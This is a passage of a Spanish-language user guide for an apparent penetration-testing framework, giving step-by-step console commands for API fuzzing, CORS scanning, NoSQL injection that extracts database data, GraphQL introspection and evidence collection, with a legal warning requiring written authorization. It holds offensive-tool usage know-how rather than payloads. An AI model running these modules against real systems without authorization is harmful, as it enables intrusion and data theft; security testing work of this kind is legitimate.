- Secreto encontrado (si es débil)
- Token decodificado
- Posibilidad de forjar tokens

---

### 44. 🔍 API Fuzzer (Probador de APIs)

**¿Qué hace?**  
Prueba automáticamente endpoints de APIs buscando vulnerabilidades.

**¿Cuándo usarlo?**  
Para auditar la seguridad de APIs REST.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use web/api_fuzzer

# 2. Establece la URL base de la API
kndys(web/api_fuzzer)> set target https://api.example.com

# 3. Proporciona token de autenticación (si es necesario)
kndys(web/api_fuzzer)> set token YOUR_API_TOKEN

# 4. Ejecuta
kndys(web/api_fuzzer)> run
```

**¿Qué verás?**  
- Endpoints descubiertos
- Parámetros vulnerables
- Respuestas inesperadas
- Errores de autorización

---

### 45. 🌐 CORS Scanner (Escáner de CORS)

**¿Qué hace?**  
Verifica si un sitio web tiene mal configuradas las políticas de intercambio de recursos entre orígenes.

**¿Cuándo usarlo?**  
Para encontrar APIs que permiten acceso desde cualquier dominio.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use web/cors_scanner

# 2. Establece la URL
kndys(web/cors_scanner)> set target https://api.example.com

# 3. Ejecuta
kndys(web/cors_scanner)> run
```

**¿Qué verás?**  
- Configuración CORS actual
- Dominios permitidos
- Vulnerabilidades CORS
- Riesgo de robo de datos

---

### 46. 🗄️ NoSQL Injection (Inyección NoSQL)

**¿Qué hace?**  
Busca y explota vulnerabilidades de inyección en bases de datos NoSQL (MongoDB, etc.).

**¿Cuándo usarlo?**  
En aplicaciones web que usan bases de datos NoSQL.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use web/nosql_injection

# 2. Establece la URL
kndys(web/nosql_injection)> set target http://example.com/api/users

# 3. Define el parámetro vulnerable
kndys(web/nosql_injection)> set param username

# 4. Ejecuta
kndys(web/nosql_injection)> run
```

**¿Qué verás?**  
- Payloads de NoSQL probados
- Vulnerabilidades encontradas
- Datos extraídos de la base de datos

---

### 47. 📊 GraphQL Introspection (Introspección GraphQL)

**¿Qué hace?**  
Obtiene el esquema completo de una API GraphQL, revelando todos los queries y mutaciones disponibles.

**¿Cuándo usarlo?**  
Para mapear completamente una API GraphQL.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use web/graphql_introspection

# 2. Establece el endpoint GraphQL
kndys(web/graphql_introspection)> set target https://example.com/graphql

# 3. Ejecuta
kndys(web/graphql_introspection)> run
```

**¿Qué verás?**  
- Esquema completo de la API
- Todos los tipos disponibles
- Queries y mutaciones
- Campos ocultos o no documentados

---

### 48. 📦 Evidence Collector (Recolector de Evidencias)

**¿Qué hace?**  
Recopila y empaqueta toda la evidencia de una prueba de penetración.

**¿Cuándo usarlo?**  
Al finalizar una auditoría para crear un paquete forense.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use utility/evidence_collector

# 2. Define el nombre del caso
kndys(utility/evidence_collector)> set case_name PenTest_2025

# 3. Ejecuta
kndys(utility/evidence_collector)> run
```

**¿Qué verás?**  
- Logs recopilados
- Capturas de pantalla incluidas
- Archivo comprimido con toda la evidencia
- Hash de integridad generado

---

## 📝 Consejos Generales

### Antes de Usar Cualquier Módulo:

1. **Permiso**: Asegúrate de tener autorización escrita
2. **Entorno**: Usa entornos de prueba cuando sea posible
3. **Documentación**: Registra todo lo que hagas
4. **Legalidad**: Conoce las leyes de tu país

### Estructura Común de Comandos:

```bash
# Patrón general
use <categoría>/<módulo>    # Selecciona el módulo
show options                # Ver opciones configurables
set <opción> <valor>       # Configurar una opción
run                        # Ejecutar el módulo
back                       # Regresar al menú principal
```

### Opciones Globales Comunes:

- `target`: URL o IP del objetivo
- `lhost`: Tu dirección IP
- `lport`: Tu puerto de escucha
- `threads`: Número de hilos paralelos
- `timeout`: Tiempo de espera máximo
- `verbose`: Mostrar información detallada

---

## 🎓 Recursos de Aprendizaje

Para aprender más sobre cada módulo:

1. **Comando info**: Dentro de cada módulo, usa `info` para ver descripción detallada
2. **Comando help**: Muestra comandos disponibles
3. **Documentación**: Ver [DOCUMENTATION_INDEX.md](DOCUMENTATION_INDEX.md)

---

## ⚠️ Advertencia Legal

Esta guía es solo para **propósitos educativos y pruebas autorizadas**. El uso indebido de estas herramientas puede:

- Violar leyes locales e internacionales
- Resultar en cargos criminales
- Causar daños civiles
- Terminar en prisión

**Usa estas herramientas SOLO en:**
- Tus propios sistemas
- Sistemas donde tienes permiso ESCRITO
- Entornos de laboratorio
- Plataformas de práctica legales (HackTheBox, TryHackMe, etc.)

---

## 🆘 Ayuda Rápida

¿Atascado? Prueba esto:

```bash
# Ver todas las opciones del módulo actual
show options

# Ver información detallada del módulo
info

# Ver comandos disponibles
help

# Regresar al menú principal
back

# Salir del framework
exit
```

---

**¡Feliz Aprendizaje! 🎉**

Recuerda: Un gran poder conlleva una gran responsabilidad. Usa estas herramientas éticamente.
